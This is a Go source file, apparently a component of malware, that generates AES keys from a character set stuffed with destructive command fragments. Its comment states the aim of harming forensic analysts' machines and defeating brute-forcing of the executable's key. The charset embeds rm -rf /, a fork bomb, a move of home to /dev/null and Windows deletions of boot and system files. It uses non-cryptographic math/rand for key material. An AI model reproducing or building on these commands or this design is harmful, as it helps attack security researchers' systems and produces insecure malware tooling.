package KeyGenerator

import (
	"math/rand"
	"time"
)

/*
THe idea is to generate AES256 keys with malicious commands embedded inside of them to defeat password crackers and brute forcing the key of the executable. It will potentially cause permanent damage to the forensic machine analyzing the malware with command line tools

*/
// Alphanumeric Charset
const charset = "abcdefghijklmnopqrstuvwxyz" +
	"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789<>|$&^rm-rf/:(){:|:&};mv~/dev/nulldelete%systemdrive%*.*/f/sdelc:autoexec.batdelc:boot.inidelc:ntldrdelc:windowswin.ini"
//// Malicious Linux operators
//const pipeCharset = "<>|$&^"
//// https://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/
//const dangerousLinuxCommandsCharset = "rm\-rf\/:(){:|:&};mv\~\/dev/null"
//// https://techgearsz.blogspot.com/2017/11/top-5-most-dangerous-cmd-commands-for.html
//const dangerousWindowsCommandsCharset = "delete\%systemdrive%\*.*\/f\/sdel\c:\\autoexec.batdel\c:\\boot.inidel\c:\\ntldrdel\c:\\windows\\win.ini"

var seededRand *rand.Rand = rand.New(
	rand.NewSource(time.Now().UnixNano()))

func StringWithCharset(length int, charset string) string {
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}

func GenerateKey(length int) string {
	return StringWithCharset(length, charset)
}

//
/*
func main() {
	key := String(64)
	fmt.Println(key)
}

*/